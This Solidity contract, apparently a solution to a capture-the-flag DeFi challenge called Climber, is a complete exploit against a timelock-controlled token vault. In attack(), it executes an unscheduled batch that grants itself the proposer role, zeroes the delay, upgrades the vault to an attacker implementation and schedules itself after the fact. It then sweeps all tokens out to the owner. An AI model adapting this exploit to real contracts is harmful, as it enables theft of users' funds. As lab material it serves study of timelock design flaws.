//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        address amount
    ) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address from) external returns (uint256);
}

interface ITimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function updateDelay(uint64 newDelay) external;

    function grantRole(bytes32 role, address account) external;
}

contract AttackClimber {
    address public owner;
    address public vault;
    address public timelock;
    address public token;
    address public badVault;
    bool public scheduled;

    address[] targets;
    uint256[] values;
    bytes[] data;

    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        address _owner,
        address _vault,
        address _timelock,
        address _token,
        address _badVault
    ) {
        owner = _owner;
        vault = _vault;
        timelock = _timelock;
        token = _token;
        badVault = _badVault;
    }

    function schedule() external {
        ITimelock(timelock).schedule(targets, values, data, 0);

        (bool setSweeper, ) = vault.call(
            abi.encodeWithSignature("_setSweeper(address)", address(this))
        );
        (bool sweep, ) = vault.call(
            abi.encodeWithSignature("sweepFunds(address)", token)
        );
        require(setSweeper && sweep, "Sweep failed");
    }

    function attack() external {
        for (uint256 i; i < 4; i++) {
            values.push(0);
        }

        // Grant ourselves the proposer role
        targets.push(timelock);
        data.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        // Update the delay to 0
        targets.push(timelock);
        data.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // Upgrade the vault to a new implementation
        targets.push(vault);
        data.push(abi.encodeWithSignature("upgradeTo(address)", badVault));

        // call schedule on this address
        targets.push(address(this));
        data.push(abi.encodeWithSignature("schedule()"));

        ITimelock(timelock).execute(targets, values, data, 0);
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }
}
